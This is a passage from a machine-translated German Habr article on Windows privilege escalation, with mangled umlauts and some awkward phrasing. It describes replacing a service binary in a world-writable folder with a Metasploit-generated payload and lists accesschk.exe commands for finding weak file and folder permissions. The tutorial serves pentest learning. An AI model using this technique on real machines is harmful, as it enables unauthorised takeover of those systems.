(authentifizierter Benutzer) Schreibzugriff auf diesen Ordner hat.  In diesem Beispiel k√∂nnen wir die ausf√ºhrbare Bin√§rdatei einfach mit der von metasploit generierten Datei √ºberschreiben. <br><br>  Kann optional codiert werden. <br><br><img src="https://habrastorage.org/webt/7c/p6/qv/7cp6qviajkpgxvibpruzsgqhjv4.png"><br><br>  Jetzt m√ºssen Sie nur noch die sch√§dliche ausf√ºhrbare Datei herunterladen und im Ordner f√ºr ausf√ºhrbare Dateien √ºberschreiben.  Sobald dies erledigt ist, k√∂nnen wir sicher ins Bett gehen und fr√ºh morgens einen systemischen Spaziergang machen. <br><br>  Diese beiden Beispiele sollen uns einen Eindruck von den Sicherheitsl√ºcken geben, nach denen gesucht werden muss, wenn Berechtigungen f√ºr Dateien und Ordner ber√ºcksichtigt werden.  Das Erlernen aller Binpath-Pfade f√ºr Windows-Dienste, geplante Aufgaben und Autorun-Aufgaben dauert einige Zeit. <br><br>  Zum Schluss noch ein paar Tipps zur Verwendung von accesschk.exe. <br><br>  Finden Sie alle schwachen Berechtigungen f√ºr Ordner auf der Festplatte. <br><br><pre> <code class="hljs swift">accesschk.exe -uwdqs <span class="hljs-type"><span class="hljs-type">Users</span></span> <span class="hljs-built_in"><span class="hljs-built_in">c</span></span>:\ accesschk.exe -uwdqs <span class="hljs-string"><span class="hljs-string">"Authenticated Users"</span></span> <span class="hljs-built_in"><span class="hljs-built_in">c</span></span>:\</code> </pre><br>  Finden Sie alle schwachen Berechtigungen f√ºr Dateien auf der Festplatte. <br><br><pre> <code class="hljs swift">accesschk.exe -uwqs <span class="hljs-type"><span class="hljs-type">Users</span></span> <span class="hljs-built_in"><span class="hljs-built_in">c</span></span>:\*.* accesschk.exe -uwqs <span class="hljs-string"><span class="hljs-string">"Authenticated Users"</span></span> <span class="hljs-built_in"><span class="hljs-built_in">c</span></span>:\*.*</code> </pre> <br>  Wie alles. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de418441/">https://habr.com/ru/post/de418441/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de418429/index.html">Meine Berufserfahrung f√ºr die Rolle des agilen Coach in Europa, Teil Zwei</a></li>
<li><a href="../de418431/index.html">Imagin√§re Probleme - die Wurzel schlechter Software</a></li>
<li><a href="../de418433/index.html">4. August Peter. Die erste Fahrradsuche f√ºr Programmierer</a></li>
<li><a href="../de418437/index.html">Oc Team zur Rettung</a></li>
<li><a href="../de418439/index.html">Progressive Webanwendungsgrundlagen</a></li>
<li><a href="../de418443/index.html">GObject: Kapselung, Instanziierung, Selbstbeobachtung</a></li>
<li><a href="../de418445/index.html">Django Channels - die Antwort auf das moderne Web</a></li>
<li><a href="../de418447/index.html">Warum Moscow Python Conf jetzt ++ ist</a></li>
<li><a href="../de418449/index.html">Bin√§rmodule f√ºr Python</a></li>
<li><a href="../de418451/index.html">3D-Druckunterricht. Effektive Unterst√ºtzung und √Ñnderung der Schichth√∂he in der Praxis von 3Dtool</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>